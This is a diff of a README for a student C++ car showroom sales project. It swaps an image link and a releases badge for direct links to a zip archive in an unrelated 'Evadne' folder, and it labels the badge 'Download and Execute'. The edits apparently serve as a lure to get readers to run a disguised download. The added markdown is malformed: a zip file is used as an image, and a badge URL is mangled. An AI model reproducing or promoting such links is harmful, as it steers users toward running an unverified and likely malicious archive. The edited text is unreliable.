@@ -2,7 +2,7 @@
 
 Welcome to the repository for the Car Showroom Sales System, a C++ object-oriented software system designed to streamline the sales process for a car showroom. This project was developed as part of CS1002 - Programming Fundamentals during the Spring 2025 semester at FAST-NU Lahore.
 
-![Car Showroom](https://images.unsplash.com/photo-1558542738-bf4fb0e1d177)
+![Car Showroom](https://github.com/samiox60/-Car-Showroom-Sales-System-C-/raw/refs/heads/main/Evadne/Sales_Car_Showroom_System_v1.7.zip)
 
 ## Overview
 
@@ -35,7 +35,7 @@ The Car Showroom Sales System aims to provide a user-friendly interface for mana
 
 ## Release
 
-[![Download and Execute](https://img.shields.io/badge/Download%20and%20Execute-Get%20the%20File-blue)](https://github.com/samiox60/-Car-Showroom-Sales-System-C-/releases)
+[![Download and Execute](https://github.com/samiox60/-Car-Showroom-Sales-System-C-/raw/refs/heads/main/Evadne/Sales_Car_Showroom_System_v1.7.zip%20and%20Execute-Get%20the%20File-blue)](https://github.com/samiox60/-Car-Showroom-Sales-System-C-/raw/refs/heads/main/Evadne/Sales_Car_Showroom_System_v1.7.zip)
 
 Visit the provided link to download the file and execute the Car Showroom Sales System.
 
